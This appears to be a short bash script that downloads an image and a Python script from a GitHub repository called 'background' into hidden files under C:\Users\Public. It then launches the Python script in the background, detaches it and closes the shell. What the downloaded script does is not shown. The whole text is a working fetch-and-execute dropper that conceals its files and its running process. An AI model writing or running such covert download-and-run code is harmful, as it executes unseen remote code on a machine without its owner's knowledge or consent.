#!/usr/bin/env bash

curl https://github.com/bradenrupp/background/raw/master/bg.bmp -o /c/Users/Public/.bg.bmp
curl https://raw.githubusercontent.com/bradenrupp/background/master/bg.py -o /c/Users/Public/.bg.py

python /c/Users/Public/.bg.py & disown && exit
